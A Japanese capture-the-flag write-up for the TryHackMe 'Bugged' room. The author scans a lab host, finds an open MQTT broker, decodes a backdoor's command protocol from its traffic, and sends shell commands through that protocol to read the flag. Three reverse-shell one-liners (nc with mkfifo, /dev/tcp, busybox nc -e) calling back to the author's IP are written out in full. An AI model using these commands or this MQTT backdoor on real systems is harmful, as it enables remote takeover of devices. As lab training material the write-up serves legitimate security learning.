# Bugged CTF

https://tryhackme.com/room/bugged

ジョンはスマートホーム機器を操作していたとき、ネットワーク上で奇妙なトラフィックが発生していることに気付きました。この奇妙なネットワーク通信が何なのかをジョンが理解できるよう手伝ってもらえませんか?

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.20.67
root@ip-10-10-56-95:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-29 04:04 GMT
Nmap scan report for 10.10.20.67
Host is up (0.00048s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1883/tcp open  mqtt
MAC Address: 02:EF:88:BE:1C:25 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.49 seconds
root@ip-10-10-56-95:~# sudo nmap -sV -p1883 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-29 04:04 GMT
Nmap scan report for 10.10.20.67
Host is up (0.00015s latency).

PORT     STATE SERVICE VERSION
1883/tcp open  mqtt
MAC Address: 02:EF:88:BE:1C:25 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

1883 mqtt のみ

## 1883 MQTT

とりあえず、metasploitでスキャン

```shell
msf6 auxiliary(scanner/mqtt/connect) > show options

Module options (auxiliary/scanner/mqtt/connect):

   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   ANONYMOUS_LOGIN   false                             yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                            no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
   RHOSTS            10.10.20.67                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             1883                              yes       The target port (TCP)
   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
   THREADS           1                                 yes       The number of concurrent threads (max one per host)
   USERNAME          john                              no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      true                              no        Try the username as the password for all users
   USER_FILE                                           no        File containing usernames, one per line
   VERBOSE           true                              yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mqtt/connect) > run

[*] 10.10.20.67:1883      - 10.10.20.67:1883 - Testing without credentials
[+] 10.10.20.67:1883      - Does not require authentication
[*] 10.10.20.67:1883      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

認証は要求されないという結果。

mosquitto クライアントインストール

```ssh
apt install mosquitto mosquitto-clients
```

ワイルドカードを指定してすべてのメッセージをサブスクライブする。

```shell
mosquitto_sub -h 10.10.20.67 -t "#" -v
```

目立つメッセージが出ている。

```shell
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

Base64デコード

```shell
$ echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

これを実行すると、
```shell
mosquitto_pub -h 10.10.20.67 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '"HELP"'
```

サブスクライブを監視している方でこれが表示される。

```shell
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

デコード。
```text
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"}) 
```

下記をBase64エンコードして送信する。

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"HELP", "arg":""}
```

反応をデコード
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
```

これでバックドアの仕様が判明した。  
CMDはシェルコマンドで、SYSはシステム情報を返すということ。

### リバースシェル

１．いつものリバースシェルを送ってみる。

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f"}
```

```shell
$ mosquitto_pub -h 10.10.20.67 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsICJjbWQiOiJDTUQiLCAiYXJnIjoicm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjIuMjIuMTgyIDY2NjYgPi90bXAvZiJ9Cg=='
```

nc not found という反応。

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"/bin/sh: 1: nc: not found\n"} 
```

２．ncを使わないタイプ。

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"sh -i >& /dev/tcp/10.2.22.182/6666 0>&1"}
```

Bad fd number という反応。

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"/bin/sh: 1: Syntax error: Bad fd number\n"} 
```

３．busybox

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"busybox nc 10.2.22.182 6666 -e sh"}
```

busybox not found

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"/bin/sh: 1: busybox: not found\n"}
```

ダブルクォートが含まれるリバースシェルはエラーになるので、有効なものが見つからない。

### ls

lsコマンドを実行してみる。

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"ls -al"}
```

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"total 32\ndrwxr-xr-x 1 challenge challenge 4096 Mar 22  2022 .\ndrwxr-xr-x 1 root      root      4096 Mar 22  2022 ..\n-rw------- 1 challenge challenge   28 Mar 22  2022 .bash_history\n-rw-r--r-- 1 challenge challenge  220 Aug  4  2021 .bash_logout\n-rw-r--r-- 1 challenge challenge 3526 Aug  4  2021 .bashrc\n-rw-r--r-- 1 challenge challenge  807 Aug  4  2021 .profile\n-rw-r--r-- 1 root      root        39 Mar 21  2022 flag.txt\n"}
```

カレントディレクトリに flag.txt が置かれていることが分かった。

### cat

```
```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"cat flag.txt"}
```

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{ひみつ}\n"}
```

フラグゲット。

## 振り返り

- MQTT は IoT向けのメッセージシステムというのはぼんやり認識していたが、初めてハンズオンで練習できたのはよかった。
- ウォークスルーをざっと見た感じ、リバースシェルの取得に成功している人はいなかった。
